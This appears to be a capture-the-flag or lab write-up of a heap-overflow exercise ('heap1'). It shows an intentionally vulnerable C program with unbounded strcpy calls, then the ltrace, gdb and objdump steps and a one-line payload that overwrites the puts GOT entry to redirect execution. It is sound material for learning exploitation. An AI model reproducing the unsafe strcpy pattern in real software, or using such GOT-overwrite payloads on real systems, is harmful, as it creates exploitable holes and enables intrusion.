Let’s take a look at the code…

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

  

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

Looking at this code, the two strcpy commands down at the bottom will allow us to write essentially any string we want, anywhere in the program. In order to do this we will first need to control either the “1->name” or “i2->name” parameter. 

If we open up the program in gdb, and look at the disassembly we can see that the compiler used the puts function to perform the printf function. We can overwrite the address of the puts function, to that of the winner function and that will allow us to pwn the program. First we will need to see where all of the addresses are, using a tool called ltrace.

```
ltrace ./heap1 11111111 00000000”

malloc(8)                    = 0x0804a008 
malloc(8)                    = 0x0804a018
malloc(8)                    = 0x0804a028 
malloc(8)                    = 0x0804a038
strcpy(0x804a018, “11111111”)         = 0x0804a018
strcpy(0x804a038, “00000000”)         = 0x0804a038
```

That isn’t the full output of the command, but that’s everything we need. What we can do to pwn the program, is we can overwrite i2->name, in order to write anywhere we want. Currently the heap has four different memory allocations, each worth 8 bytes. This output confirms that the 8 byte memory spaces located at 0x0804a018 ann 0x0804a038 are what is being written using the strcpy commands. This requires that we know the offset between the point where we first input data (0x0804a018), and where the name is stored.  The only space left for i2->name to be left in is 0x0804a028. Before i2->name is stored, and int is also stored in the same space which takes up 4 bytes. So 4 + 0x0804a028  = 0x0804a02c. So the offset is 0x0804a02c - 0x0804a018 = 20. Now we just need to find out the address for the winner and puts functions.

```
gdb ./heap1
print winner 
$1 = {void (void)} 0x8048494
```

Now that we know that the address of the winner function is 0x8048494, we can use objdump to print out the addresses of the Global Offset Table, which will have the puts address we are going to overwrite stored.

```
“objdump -R heap1 | grep puts”
08049774 R_386_JUMP_SLOT puts
```

Now we have the address of puts, which is 0x08049774. Now we just need to construct the payload which will should theoretically look like this.

first_argument(filler + puts_address) + second_argument(winner_address)

Now let’s try it irl

```
./heap1 `python -c ‘print “1”*20 + “\x74\x97\x04\x08” + “ “ + “\x94\x84\x04\x08”’`
And we have a winner @ 1480884576
```

And just like that, we pwned that program.
